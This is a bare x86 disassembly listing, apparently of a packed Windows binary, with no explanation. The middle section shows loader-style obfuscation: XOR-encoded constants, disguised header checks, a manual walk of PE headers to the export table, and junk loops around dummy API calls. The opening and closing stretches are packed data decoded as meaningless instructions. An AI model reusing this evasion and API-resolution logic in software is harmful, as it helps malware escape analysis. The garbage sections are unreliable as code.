  40a1a2:	xor    al,0x5c
  40a1a4:	pop    ebp
  40a1a5:	inc    ebp
  40a1a6:	or     DWORD PTR [ebx-0x75973a7d],0x6a
  40a1ad:	cli    
  40a1ae:	sar    bl,0x2d
  40a1b1:	inc    ebp
  40a1b2:	ins    DWORD PTR es:[edi],dx
  40a1b3:	shl    DWORD PTR [edx-0x20],1
  40a1b6:	sbb    ecx,ecx
  40a1b8:	lock xlat BYTE PTR ds:[ebx]
  40a1ba:	sub    DWORD PTR [edx+edi*1+0x7f779fa9],edx
  40a1c1:	loop   0x40a209
  40a1c3:	fnstcw WORD PTR [ebx-0x526b32e7]
  40a1c9:	xchg   dl,dl
  40a1cb:	das    
  40a1cc:	ficomp DWORD PTR [ebp+0x7ac98a8d]
  40a1d2:	inc    esi
  40a1d3:	out    dx,al
  40a1d4:	(bad)
  40a1d7:	ret    
  40a1d8:	xchg   BYTE PTR [edi+0x1b],al
  40a1db:	and    DWORD PTR [eax*8-0x609f4b86],eax
  40a1e2:	pop    ss
  40a1e3:	test   eax,0xbc4b293f
  40a1e8:	mov    dl,0x5e
  40a1ea:	in     al,dx
  40a1eb:	jb     0x40a1e0
  40a1ed:	xchg   ebx,eax
  40a1ee:	lods   al,BYTE PTR ds:[esi]
  40a1ef:	in     eax,0x81
  40a1f1:	add    eax,DWORD PTR ss:[eax+0x609a9652]
  40a1f8:	popw   ss
  40a1fa:	dec    ecx
  40a1fb:	push   esi
  40a1fc:	cli    
  40a1fd:	fmul   QWORD PTR [ebx+edx*4-0x693d2d20]
  40a204:	and    BYTE PTR [edi+ecx*1+0x15],dh
  40a208:	paddusw mm4,mm6
  40a20b:	(bad)  
  40a20c:	jns    0x40a263
  40a20e:	loopne 0x40a28c
  40a210:	popa   
  40a211:	repnz adc dh,al
  40a214:	ins    DWORD PTR es:[edi],dx
  40a215:	add    al,0xd7
  40a217:	sahf   
  40a218:	daa    
  40a219:	pop    edx
  40a21a:	pop    ds
  40a21b:	dec    ebx
  40a21c:	lahf   
  40a21d:	shr    BYTE PTR [eax+0x54],1
  40a220:	sbb    edx,DWORD PTR [eax+0x55]
  40a223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a224:	and    al,0xa1
  40a226:	js     0x40a221
  40a228:	cld    
  40a229:	push   ds
  40a22a:	lock xchg esi,eax
  40a22c:	pop    ds
  40a22d:	and    DWORD PTR ds:0xa4fa00cf,esp
  40a233:	sbb    al,0xb8
  40a235:	jge    0x40a24f
  40a237:	mov    DWORD PTR [esi+edi*8-0x64365e1b],edx
  40a23e:	sub    al,0x83
  40a240:	cmp    al,0x47
  40a242:	push   0x4f
  40a244:	jl     0x40a1d8
  40a246:	jns    0x40a224
  40a248:	jge    0x40a268
  40a24a:	xor    eax,0xb78acf41
  40a24f:	imul   ecx,DWORD PTR [bp+0x634f],0x3f
  40a255:	mov    edx,0x8dc4064f
  40a25a:	test   BYTE PTR [eax],bh
  40a25c:	(bad)  
  40a25d:	in     eax,0x64
  40a25f:	add    BYTE PTR [ebx-0x6ccf383],cl
  40a265:	add    edi,edx
  40a267:	imul   eax,edi
  40a26a:	mov    edi,DWORD PTR [ebp+0xc]
  40a26d:	xor    edi,ecx
  40a26f:	sub    edi,eax
  40a271:	mov    eax,DWORD PTR [ebp-0x4]
  40a274:	add    edi,edx
  40a276:	cmp    DWORD PTR [eax],edi
  40a278:	mov    eax,DWORD PTR [ebp-0x4]
  40a27b:	mov    edi,DWORD PTR [ebp+0x10]
  40a27e:	jg     0x40a291
  40a284:	xor    edi,ecx
  40a286:	mov    ebx,esi
  40a288:	sub    ebx,edi
  40a28a:	add    DWORD PTR [eax],ebx
  40a28c:	jmp    0x40a297
  40a291:	xor    edi,ecx
  40a293:	add    edi,edx
  40a295:	add    DWORD PTR [eax],edi
  40a297:	mov    eax,DWORD PTR [ebp-0x8]
  40a29a:	mov    edi,DWORD PTR [ebp-0x10]
  40a29d:	mov    eax,DWORD PTR [eax]
  40a29f:	xor    edi,ecx
  40a2a1:	add    edi,0x3272e1
  40a2a7:	not    edi
  40a2a9:	and    eax,edi
  40a2ab:	movsx  di,BYTE PTR [eax+0x1]
  40a2b0:	mov    ebx,0x3b51
  40a2b5:	sub    di,bx
  40a2b8:	mov    ebx,0x8a8d
  40a2bd:	xor    di,bx
  40a2c0:	mov    ebx,0x4f84
  40a2c5:	cmp    di,bx
  40a2c8:	jne    0x40a2f0
  40a2ce:	movsx  di,BYTE PTR [eax]
  40a2d2:	mov    ebx,0x3b51
  40a2d7:	sub    di,bx
  40a2da:	mov    ebx,0x8a8d
  40a2df:	xor    di,bx
  40a2e2:	mov    ebx,0x4e71
  40a2e7:	cmp    di,bx
  40a2ea:	je     0x40a300
  40a2f0:	mov    edi,DWORD PTR [ebp-0x10]
  40a2f3:	xor    edi,ecx
  40a2f5:	mov    ebx,esi
  40a2f7:	sub    ebx,edi
  40a2f9:	add    eax,ebx
  40a2fb:	jmp    0x40a2ab
  40a300:	mov    esi,DWORD PTR [ebp-0x14]
  40a303:	mov    esi,DWORD PTR [esi]
  40a305:	mov    edi,DWORD PTR [eax+0x3c]
  40a308:	lea    esi,[edi+esi*8+0x78]
  40a30c:	mov    esi,DWORD PTR [esi+eax*1]
  40a30f:	mov    DWORD PTR [ebp-0x8],esi
  40a312:	mov    esi,DWORD PTR [ebp+0x8]
  40a315:	xor    esi,ecx
  40a317:	add    esi,edx
  40a319:	mov    DWORD PTR [ebp-0x14],esi
  40a31c:	mov    esi,DWORD PTR [ebp+0x8]
  40a31f:	mov    edi,DWORD PTR [ebp-0x8]
  40a322:	xor    esi,ecx
  40a324:	add    esi,edx
  40a326:	pop    ebx
  40a327:	cmp    edi,esi
  40a329:	jne    0x40a347
  40a32f:	mov    eax,DWORD PTR [ebp+0xc]
  40a332:	xor    eax,ecx
  40a334:	mov    ecx,DWORD PTR [ebp-0x8]
  40a337:	add    eax,edx
  40a339:	imul   eax,ecx
  40a33c:	mov    DWORD PTR [ebp-0x8],eax
  40a33f:	push   DWORD PTR [ebp+0x18]
  40a342:	jmp    0x40a39b
  40a347:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34a:	add    ecx,eax
  40a34c:	mov    DWORD PTR [ebp-0x14],ecx
  40a34f:	mov    ecx,DWORD PTR [ebp-0x14]
  40a352:	mov    ecx,DWORD PTR [ecx+0xc]
  40a355:	movsx  cx,BYTE PTR [ecx+eax*1]
  40a35a:	mov    edx,0x3b51
  40a35f:	sub    cx,dx
  40a362:	mov    edx,0x8a8d
  40a367:	xor    cx,dx
  40a36a:	mov    edx,0x4e77
  40a36f:	cmp    cx,dx
  40a372:	jne    0x40a33f
  40a378:	mov    ecx,DWORD PTR ds:0x43a2d4
  40a37e:	mov    ecx,DWORD PTR [ecx+0x198]
  40a384:	mov    DWORD PTR [ecx],eax
  40a386:	jmp    0x40a3ac
  40a38b:	mov    ecx,DWORD PTR [ebp+0x18]
  40a38e:	cmp    ecx,0xf89c8584
  40a394:	jne    0x40a3ac
  40a39a:	push   eax
  40a39b:	push   DWORD PTR [ebp+0x14]
  40a39e:	push   DWORD PTR [ebp+0x10]
  40a3a1:	push   DWORD PTR [ebp+0xc]
  40a3a4:	push   DWORD PTR [ebp+0x8]
  40a3a7:	call   0x407a51
  40a3ac:	pop    edi
  40a3ad:	pop    esi
  40a3ae:	leave  
  40a3af:	ret    0x14
  40a3b2:	push   ebp
  40a3b3:	mov    ebp,esp
  40a3b5:	sub    esp,0xc
  40a3b8:	sbb    DWORD PTR ds:0x43701c,0x4790
  40a3c2:	push   esi
  40a3c3:	mov    DWORD PTR ds:0x435018,0x19
  40a3cd:	cmp    DWORD PTR ds:0x435018,0x0
  40a3d4:	je     0x40a404
  40a3da:	cmp    DWORD PTR ds:0x435018,0x1b
  40a3e1:	ja     0x40a404
  40a3e7:	jmp    0x40a3f2
  40a3ec:	call   DWORD PTR ds:0x43a8f0
  40a3f2:	mov    esi,DWORD PTR ds:0x435018
  40a3f8:	dec    esi
  40a3f9:	mov    DWORD PTR ds:0x435018,esi
  40a3ff:	jmp    0x40a3cd
  40a404:	mov    esi,0xf89c8585
  40a409:	not    DWORD PTR ds:0x436000
  40a40f:	mov    DWORD PTR [ebp-0x8],esi
  40a412:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40a419:	push   edi
  40a41a:	mov    eax,eax
  40a41c:	mov    edi,DWORD PTR ds:0x4165b4
  40a422:	mov    ecx,DWORD PTR ds:0x43900c
  40a428:	sub    ecx,edi
  40a42a:	imul   edi,DWORD PTR [edi+ecx*1]
  40a42e:	mov    eax,DWORD PTR [ebp-0x4]
  40a431:	mov    edi,DWORD PTR [ebp-0x8]
  40a434:	mov    ecx,0x751089b
  40a439:	movzx  edx,WORD PTR ds:0x43700c
  40a440:	or     DWORD PTR ds:0x438014,edx
  40a446:	xor    eax,ecx
  40a448:	adc    edx,0x57d4
  40a44e:	xor    edi,ecx
  40a450:	and    edx,0x6c30
  40a456:	mov    edx,0x3272e2
  40a45b:	add    DWORD PTR ds:0x435008,0x434004
  40a465:	add    edi,edx
  40a467:	sub    DWORD PTR ds:0x437008,0x434008
  40a471:	add    eax,edx
  40a473:	imul   eax,edi
  40a476:	mov    DWORD PTR ds:0x436014,edi
  40a47c:	mov    edi,DWORD PTR [ebp+0xc]
  40a47f:	cmp    edi,eax
  40a481:	je     0x40a549
  40a487:	and    eax,0xc4b
  40a48c:	mov    DWORD PTR [ebp-0xc],esi
  40a48f:	mov    esi,DWORD PTR ds:0x416528
  40a495:	mov    esi,DWORD PTR [esi]
  40a497:	sub    DWORD PTR ds:0x437018,esi
  40a49d:	mov    eax,DWORD PTR [ebp-0xc]
  40a4a0:	mov    DWORD PTR ds:0x435004,0x19
  40a4aa:	cmp    DWORD PTR ds:0x435004,0x0
  40a4b1:	je     0x40a500
  40a4b7:	cmp    DWORD PTR ds:0x435004,0x4
  40a4be:	jg     0x40a500
  40a4c4:	jmp    0x40a4d2
  40a4c9:	push   DWORD PTR [ebp-0x28]
  40a4cc:	call   DWORD PTR ds:0x43a8f4
  40a4d2:	cmp    DWORD PTR ds:0x435004,0x5
  40a4d9:	jne    0x40a4ee
  40a4df:	xor    esi,esi
  40a4e1:	or     esi,DWORD PTR ds:0x435004
  40a4e7:	dec    esi
  40a4e8:	mov    DWORD PTR ds:0x435004,esi
  40a4ee:	mov    esi,DWORD PTR ds:0x435004
  40a4f4:	dec    esi
  40a4f5:	mov    DWORD PTR ds:0x435004,esi
  40a4fb:	jmp    0x40a4aa
  40a500:	mov    esi,DWORD PTR [ebp+0xc]
  40a503:	xor    eax,ecx
  40a505:	lea    eax,[eax*8+0x1939788]
  40a50c:	mov    eax,DWORD PTR [esi+eax*1]
  40a50f:	mov    DWORD PTR [ebp+0xc],eax
  40a512:	mov    eax,DWORD PTR [ebp-0x4]
  40a515:	mov    esi,DWORD PTR [ebp-0x8]
  40a518:	xor    eax,ecx
  40a51a:	xor    esi,ecx
  40a51c:	add    esi,edx
  40a51e:	add    eax,edx
  40a520:	imul   eax,esi
  40a523:	mov    esi,DWORD PTR [ebp+0xc]
  40a526:	cmp    esi,eax
  40a528:	je     0x40a549
  40a52e:	mov    eax,DWORD PTR [ebp-0x4]
  40a531:	xor    eax,ecx
  40a533:	mov    ecx,DWORD PTR [ebp+0xc]
  40a536:	add    eax,edx
  40a538:	imul   eax,ecx
  40a53b:	add    eax,DWORD PTR [ebp+0x8]
  40a53e:	mov    DWORD PTR [ebp+0xc],eax
  40a541:	mov    eax,DWORD PTR [ebp+0xc]
  40a544:	jmp    0x40a55a
  40a549:	mov    eax,DWORD PTR [ebp-0x4]
  40a54c:	mov    esi,DWORD PTR [ebp-0x8]
  40a54f:	xor    esi,ecx
  40a551:	xor    eax,ecx
  40a553:	add    esi,edx
  40a555:	add    eax,edx
  40a557:	imul   eax,esi
  40a55a:	pop    edi
  40a55b:	pop    esi
  40a55c:	leave  
  40a55d:	ret    0x8
  40a560:	push   ebp
  40a561:	mov    ebp,esp
  40a563:	push   ecx
  40a564:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40a56b:	mov    eax,DWORD PTR [ebp-0x4]
  40a56e:	and    DWORD PTR ds:0x434010,0x0
  40a578:	jmp    0x40a58a
  40a57d:	mov    ecx,DWORD PTR ds:0x434010
  40a583:	inc    ecx
  40a584:	mov    DWORD PTR ds:0x434010,ecx
  40a58a:	cmp    DWORD PTR ds:0x434010,0x19
  40a591:	jae    0x40a5d6
  40a597:	cmp    DWORD PTR ds:0x434010,0x9
  40a59e:	jge    0x40a5d6
  40a5a4:	jmp    0x40a5b7
  40a5a9:	push   0x55fe
  40a5ae:	push   DWORD PTR [ebp-0x18]
  40a5b1:	call   DWORD PTR ds:0x43a8f8
  40a5b7:	cmp    DWORD PTR ds:0x434010,0x8
  40a5be:	jne    0x40a5d1
  40a5c4:	mov    ecx,DWORD PTR ds:0x434010
  40a5ca:	inc    ecx
  40a5cb:	mov    DWORD PTR ds:0x434010,ecx
  40a5d1:	jmp    0x40a57d
  40a5d6:	mov    edx,DWORD PTR [ebp+0x10]
  40a5d9:	mov    ecx,0x751089b
  40a5de:	xor    eax,ecx
  40a5e0:	add    eax,0x3272e2
  40a5e5:	mov    DWORD PTR [edx],eax
  40a5e7:	mov    eax,DWORD PTR [ebp+0xc]
  40a5ea:	mov    DWORD PTR ds:0x438008,0x1d
  40a5f4:	cmp    DWORD PTR ds:0x438008,0x0
  40a5fb:	je     0x40a630
  40a601:	cmp    DWORD PTR ds:0x438008,0x1e
  40a608:	jl     0x40a630
  40a60e:	jmp    0x40a61e
  40a613:	push   0x434028
  40a618:	call   DWORD PTR ds:0x43a900
  40a61e:	mov    edx,DWORD PTR ds:0x438008
  40a624:	dec    edx
  40a625:	mov    DWORD PTR ds:0x438008,edx
  40a62b:	jmp    0x40a5f4
  40a630:	xor    eax,ecx
  40a632:	push   esi
  40a633:	mov    esi,DWORD PTR [ebp+0x10]
  40a636:	mov    edx,0x3272e2
  40a63b:	add    eax,edx
  40a63d:	mov    DWORD PTR [esi+0x4],eax
  40a640:	mov    eax,DWORD PTR [ebp+0x14]
  40a643:	mov    esi,DWORD PTR [ebp+0x10]
  40a646:	mov    DWORD PTR [esi+0x8],eax
  40a649:	mov    eax,DWORD PTR [ebp+0x18]
  40a64c:	mov    esi,DWORD PTR [ebp+0x10]
  40a64f:	mov    DWORD PTR [esi+0xc],eax
  40a652:	mov    eax,DWORD PTR [ebp+0x1c]
  40a655:	mov    esi,DWORD PTR [ebp+0x10]
  40a658:	mov    DWORD PTR [esi+0x10],eax
  40a65b:	mov    eax,DWORD PTR [ebp+0x8]
  40a65e:	xor    eax,ecx
  40a660:	add    eax,edx
  40a662:	pop    esi
  40a663:	leave  
  40a664:	ret    0x18
  40a667:	push   ebp
  40a668:	mov    ebp,esp
  40a66a:	sub    esp,0x9c
  40a670:	movzx  ecx,BYTE PTR ds:0x437000
  40a677:	xor    DWORD PTR ds:0x43401c,ecx
  40a67d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a680:	mov    eax,0x8a8d
  40a685:	xor    ax,WORD PTR [ecx+0x20]
  40a689:	mov    ecx,0x3b51
  40a68e:	add    ax,cx
  40a691:	mov    ecx,DWORD PTR ds:0x436014
  40a697:	add    DWORD PTR ds:0x43801c,ecx
  40a69d:	movzx  eax,ax
  40a6a0:	mov    DWORD PTR [ebp-0x10],eax
  40a6a3:	mov    BYTE PTR [ebp-0x1],0x7d
  40a6a7:	sub    DWORD PTR ds:0x434028,edi
  40a6ad:	lea    eax,[ebp-0x1]
  40a6b0:	mov    DWORD PTR [ebp-0xc],eax
  40a6b3:	sub    ecx,0x54f4
  40a6b9:	mov    al,BYTE PTR [ebp-0x1]
  40a6bc:	add    DWORD PTR ds:0x434000,edx
  40a6c2:	mov    ecx,DWORD PTR [ebp-0xc]
  40a6c5:	and    DWORD PTR ds:0x434024,0x436014
  40a6cf:	xor    al,0x74
  40a6d1:	and    DWORD PTR ds:0x436008,0x1db4
  40a6db:	sub    al,0x8
  40a6dd:	or     DWORD PTR ds:0x434014,0x438000
  40a6e7:	mov    BYTE PTR [ecx],al
  40a6e9:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  40a6f0:	and    DWORD PTR ds:0x437014,0x0
  40a6fa:	mov    eax,ds:0x437014
  40a6ff:	inc    eax
  40a700:	mov    ds:0x437014,eax
  40a705:	cmp    DWORD PTR ds:0x437014,0x24
  40a70c:	jl     0x40a72a
  40a712:	jmp    0x40a71d
  40a717:	call   DWORD PTR ds:0x43a904
  40a71d:	cmp    DWORD PTR ds:0x437014,0x1a
  40a724:	jb     0x40a6fa
  40a72a:	push   ebx
  40a72b:	and    DWORD PTR ds:0x43701c,0x0
  40a735:	jmp    0x40a749
  40a73a:	xor    ecx,ecx
  40a73c:	add    ecx,DWORD PTR ds:0x43701c
  40a742:	inc    ecx
  40a743:	mov    DWORD PTR ds:0x43701c,ecx
  40a749:	cmp    DWORD PTR ds:0x43701c,0x1b
  40a750:	jae    0x40a778
  40a756:	cmp    DWORD PTR ds:0x43701c,0x26
  40a75d:	ja     0x40a778
  40a763:	jmp    0x40a773
  40a768:	push   0x78f7
  40a76d:	call   DWORD PTR ds:0x43a8c4
  40a773:	jmp    0x40a73a
  40a778:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  40a77f:	mov    DWORD PTR ds:0x434020,0x16
  40a789:	cmp    DWORD PTR ds:0x434020,0x0
  40a790:	je     0x40a7c3
  40a796:	cmp    DWORD PTR ds:0x434020,0x22
  40a79d:	jbe    0x40a7c3
  40a7a3:	jmp    0x40a7b0
  40a7a8:	push   0x2
  40a7aa:	call   DWORD PTR ds:0x43a8c8
  40a7b0:	xor    eax,eax
  40a7b2:	xor    eax,DWORD PTR ds:0x434020
  40a7b8:	dec    eax
  40a7b9:	mov    ds:0x434020,eax
  40a7be:	jmp    0x40a789
  40a7c3:	mov    ecx,DWORD PTR [ebp-0x18]
  40a7c6:	push   esi
  40a7c7:	and    esi,DWORD PTR ds:0x435010
  40a7cd:	mov    eax,0x751089b
  40a7d2:	xor    ecx,eax
  40a7d4:	mov    DWORD PTR ds:0x435008,0x1d
  40a7de:	cmp    DWORD PTR ds:0x435008,0x0
  40a7e5:	je     0x40a834
  40a7eb:	cmp    DWORD PTR ds:0x435008,0x7
  40a7f2:	jb     0x40a834
  40a7f8:	jmp    0x40a808
  40a7fd:	push   0x43a097
  40a802:	call   DWORD PTR ds:0x43a8d0
  40a808:	cmp    DWORD PTR ds:0x435008,0x8
  40a80f:	jne    0x40a822
  40a815:	mov    esi,DWORD PTR ds:0x435008
  40a81b:	dec    esi
  40a81c:	mov    DWORD PTR ds:0x435008,esi
  40a822:	mov    esi,DWORD PTR ds:0x435008
  40a828:	dec    esi
  40a829:	mov    DWORD PTR ds:0x435008,esi
  40a82f:	jmp    0x40a7de
  40a834:	mov    esi,0x3272e2
  40a839:	sub    DWORD PTR ds:0x43801c,0x434010
  40a843:	push   edi
  40a844:	and    DWORD PTR ds:0x436004,0x69e
  40a84e:	add    ecx,esi
  40a850:	mov    DWORD PTR ds:0x436004,0xf52
  40a85a:	jmp    0x40a87e
  40a85f:	mov    dl,BYTE PTR [ebp-0x1]
  40a862:	mov    DWORD PTR ds:0x43801c,0x56b6
  40a86c:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40a873:	mov    DWORD PTR ds:0x43701c,0x79a8
  40a87d:	inc    ecx
  40a87e:	cmp    ecx,0x40
  40a881:	mov    DWORD PTR ds:0x437010,0x2279
  40a88b:	jb     0x40a85f
  40a891:	and    DWORD PTR ds:0x43700c,0x0
  40a89b:	xor    edx,edx
  40a89d:	xor    edx,DWORD PTR ds:0x43700c
  40a8a3:	inc    edx
  40a8a4:	mov    DWORD PTR ds:0x43700c,edx
  40a8aa:	cmp    DWORD PTR ds:0x43700c,0x10
  40a8b1:	jbe    0x40a8ee
  40a8b7:	jmp    0x40a8c7
  40a8bc:	push   0x43a0f9
  40a8c1:	call   DWORD PTR ds:0x43a8d4
  40a8c7:	cmp    DWORD PTR ds:0x43700c,0xf
  40a8ce:	jne    0x40a8e1
  40a8d4:	mov    edx,DWORD PTR ds:0x43700c
  40a8da:	inc    edx
  40a8db:	mov    DWORD PTR ds:0x43700c,edx
  40a8e1:	cmp    DWORD PTR ds:0x43700c,0x1d
  40a8e8:	jb     0x40a89b
  40a8ee:	mov    edx,DWORD PTR [ebp-0x18]
  40a8f1:	and    DWORD PTR ds:0x43500c,0x435014
  40a8fb:	xor    edx,eax
  40a8fd:	adc    DWORD PTR ds:0x43700c,0x435014
  40a907:	add    edx,esi
  40a909:	jmp    0x40a9e8
  40a90e:	adc    ecx,edi
  40a910:	mov    edi,DWORD PTR [ebp+0x8]
  40a913:	mov    ecx,DWORD PTR ds:0x435018
  40a919:	sbb    DWORD PTR ds:0x43700c,ecx
  40a91f:	mov    ecx,0x8a8d
  40a924:	or     DWORD PTR ds:0x437014,0x2f73
  40a92e:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40a933:	mov    edi,0x3b51
  40a938:	add    cx,di
  40a93b:	movzx  ecx,cx
  40a93e:	mov    DWORD PTR [ebp-0xc],ecx
  40a941:	and    DWORD PTR ds:0x434008,0x0
  40a94b:	mov    ecx,DWORD PTR ds:0x434008
  40a951:	inc    ecx
  40a952:	mov    DWORD PTR ds:0x434008,ecx
  40a958:	cmp    DWORD PTR ds:0x434008,0x6
  40a95f:	jg     0x40a99a
  40a965:	jmp    0x40a973
  40a96a:	push   DWORD PTR [ebp-0x20]
  40a96d:	call   DWORD PTR ds:0x43a8dc
  40a973:	cmp    DWORD PTR ds:0x434008,0x5
  40a97a:	jne    0x40a98d
  40a980:	mov    ecx,DWORD PTR ds:0x434008
  40a986:	inc    ecx
  40a987:	mov    DWORD PTR ds:0x434008,ecx
  40a98d:	cmp    DWORD PTR ds:0x434008,0x19
  40a994:	jb     0x40a94b
  40a99a:	mov    ecx,DWORD PTR [ebp+0x8]
  40a99d:	adc    DWORD PTR ds:0x437010,0x435000
  40a9a7:	movzx  ecx,WORD PTR [ecx+edx*4]
  40a9ab:	inc    DWORD PTR ds:0x437018
  40a9b1:	xor    ecx,0x8a8d
  40a9b7:	or     DWORD PTR ds:0x43701c,0x43800c
  40a9c1:	add    ecx,edi
  40a9c3:	mov    DWORD PTR ds:0x434004,ecx
  40a9c9:	mov    edi,DWORD PTR [ebp-0xc]
  40a9cc:	mov    DWORD PTR ds:0x435018,0x55c8
  40a9d6:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40a9dd:	mov    DWORD PTR ds:0x43401c,0x7075
  40a9e7:	inc    edx
  40a9e8:	mov    ecx,DWORD PTR [ebp-0x10]
  40a9eb:	mov    DWORD PTR ds:0x437004,0x237b
  40a9f5:	cmp    edx,ecx
  40a9f7:	jne    0x40a90e
  40a9fd:	inc    ecx
  40a9fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa01:	mov    DWORD PTR ds:0x43600c,0x12
  40aa0b:	cmp    DWORD PTR ds:0x43600c,0x0
  40aa12:	je     0x40aa56
  40aa18:	cmp    DWORD PTR ds:0x43600c,0x17
  40aa1f:	ja     0x40aa56
  40aa25:	jmp    0x40aa44
  40aa2a:	push   0x43a000
  40aa2f:	push   0x6abf
  40aa34:	push   0x7f73
  40aa39:	push   0x6111
  40aa3e:	call   DWORD PTR ds:0x43a8e0
  40aa44:	mov    edi,DWORD PTR ds:0x43600c
  40aa4a:	dec    edi
  40aa4b:	mov    DWORD PTR ds:0x43600c,edi
  40aa51:	jmp    0x40aa0b
  40aa56:	mov    edx,DWORD PTR [ebp+0x10]
  40aa59:	xor    ecx,eax
  40aa5b:	dec    edi
  40aa5c:	add    ecx,esi
  40aa5e:	add    edi,0x5bbd
  40aa64:	mov    DWORD PTR [edx],ecx
  40aa66:	xor    ecx,ecx
  40aa68:	or     ecx,DWORD PTR ds:0x439004
  40aa6e:	mov    edi,DWORD PTR ds:0x43901c
  40aa74:	sub    ecx,edi
  40aa76:	or     ecx,DWORD PTR [ecx+edi*1]
  40aa79:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa7c:	sub    DWORD PTR ds:0x43400c,ecx
  40aa82:	xor    ecx,eax
  40aa84:	add    edi,DWORD PTR ds:0x436014
  40aa8a:	add    ecx,esi
  40aa8c:	or     DWORD PTR ds:0x43401c,0x72a8
  40aa96:	mov    DWORD PTR [ebp-0xc],ecx
  40aa99:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  40aaa0:	and    DWORD PTR ds:0x434018,edi
  40aaa6:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aaad:	or     DWORD PTR ds:0x434024,0x436008
  40aab7:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  40aabe:	and    DWORD PTR ds:0x436004,0x0
  40aac8:	mov    ecx,DWORD PTR ds:0x436004
  40aace:	inc    ecx
  40aacf:	mov    DWORD PTR ds:0x436004,ecx
  40aad5:	cmp    DWORD PTR ds:0x436004,0x1e
  40aadc:	ja     0x40ab14
  40aae2:	jmp    0x40ab07
  40aae7:	push   DWORD PTR [ebp-0x24]
  40aaea:	push   0x43401c
  40aaef:	push   DWORD PTR [ebp-0x20]
  40aaf2:	push   0x43a07b
  40aaf7:	push   0x8e91
  40aafc:	push   0x3182
  40ab01:	call   DWORD PTR ds:0x43a8e4
  40ab07:	cmp    DWORD PTR ds:0x436004,0x1b
  40ab0e:	jb     0x40aac8
  40ab14:	mov    ecx,DWORD PTR [ebp-0x14]
  40ab17:	mov    edi,DWORD PTR ds:0x416528
  40ab1d:	mov    edi,DWORD PTR [edi]
  40ab1f:	xor    DWORD PTR ds:0x434024,edi
  40ab25:	mov    DWORD PTR [ebp+0x8],ecx
  40ab28:	or     DWORD PTR ds:0x43600c,0x6978
  40ab32:	mov    ecx,DWORD PTR [ebp+0x8]
  40ab35:	xor    ecx,eax
  40ab37:	add    ecx,esi
  40ab39:	mov    ecx,0x242ebe9
  40ab3e:	mov    edi,0x3d76
  40ab43:	mov    edi,0xf641bea
  40ab48:	je     0x4163dd
  40ab4e:	mov    edx,DWORD PTR [ebp+0x8]
  40ab51:	mov    ebx,DWORD PTR [ebp-0x8]
  40ab54:	xor    edx,eax
  40ab56:	or     DWORD PTR ds:0x434020,0x43801c
  40ab60:	xor    ebx,eax
  40ab62:	sbb    DWORD PTR ds:0x434014,0x391d
  40ab6c:	sub    edx,ebx
  40ab6e:	and    DWORD PTR ds:0x43700c,0x5ff0
  40ab78:	sub    edx,esi
  40ab7a:	neg    ebx
  40ab7c:	xor    edx,eax
  40ab7e:	or     ebx,DWORD PTR ds:0x435018
  40ab84:	mov    DWORD PTR [ebp+0x8],edx
  40ab87:	dec    DWORD PTR ds:0x435004
  40ab8d:	mov    edx,DWORD PTR [ebp+0x8]
  40ab90:	mov    ebx,DWORD PTR [ebp-0x58]
  40ab93:	add    edx,0x5708c4
  40ab99:	imul   edx,ebx
  40ab9c:	mov    DWORD PTR [ebp-0x58],edx
  40ab9f:	mov    edx,DWORD PTR [ebp+0x8]
  40aba2:	mov    ebx,DWORD PTR [ebp-0x54]
  40aba5:	sub    DWORD PTR ds:0x434000,0x43800c
  40abaf:	add    edx,0x64f8da
  40abb5:	or     edx,ebx
  40abb7:	or     DWORD PTR ds:0x43600c,ebx
  40abbd:	mov    DWORD PTR [ebp-0x54],edx
  40abc0:	mov    edx,DWORD PTR [ebp+0x8]
  40abc3:	mov    ebx,DWORD PTR [ebp-0x50]
  40abc6:	jmp    0x40cf7a
  40abcb:	mov    ebp,0x9391ee60
  40abd0:	xchg   ebx,eax
  40abd1:	mov    ds:0x46f90650,eax
  40abd6:	(bad)  
  40abd7:	mov    BYTE PTR ds:0x60ed867,dh
  40abdd:	jl     0x40ac5b
  40abdf:	jmp    0x40ac40
  40abe1:	jl     0x40ac5f
  40abe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abe4:	pop    esp
  40abe5:	push   ebp
  40abe6:	js     0x40aba9
  40abe8:	das    
  40abe9:	imul   eax,ebp,0x2d1d5ffd
  40abef:	mov    al,0x61
  40abf1:	mov    dl,0xb6
  40abf3:	into   
  40abf4:	mov    edx,0xf370d0e7
  40abf9:	add    eax,0x11b142fe
  40abfe:	icebp  
  40abff:	cs (bad) 
  40ac01:	adc    ebp,DWORD PTR [edi]
  40ac03:	push   esp
  40ac04:	clc    
  40ac05:	ins    DWORD PTR es:[edi],dx
  40ac06:	pop    edi
  40ac07:	or     al,0x87
  40ac09:	out    0xbe,al
  40ac0b:	sbb    bl,BYTE PTR [esi]
  40ac0d:	in     eax,0x67
  40ac0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac10:	aaa    
  40ac11:	das    
  40ac12:	xor    ebx,esi
  40ac14:	cwde   
  40ac15:	sbb    al,0x66
  40ac17:	cmp    al,0x34
  40ac19:	mov    bh,BYTE PTR [eax-0x1fdd5bd5]
  40ac1f:	mov    ebp,0x54bf4fcc
  40ac24:	cdq    
  40ac25:	icebp  
  40ac26:	adc    ebp,eax
  40ac28:	jb     0x40ac58
  40ac2a:	pop    esi
  40ac2b:	cmp    eax,0x4f8f9cd8
  40ac30:	(bad)  [esi]
  40ac32:	cmp    al,0x53
  40ac35:	inc    esi
  40ac36:	and    BYTE PTR [edx],ch
  40ac38:	cmp    ebp,eax
  40ac3a:	mov    esi,0x1e8027bb
  40ac3f:	fldlg2 
  40ac41:	int    0xd1
  40ac43:	push   0x46
  40ac45:	cli    
  40ac46:	push   es
  40ac47:	imul   eax,DWORD PTR [esi-0x4f9ea3c5],0x37
  40ac4e:	mov    esi,0xd3795dc8
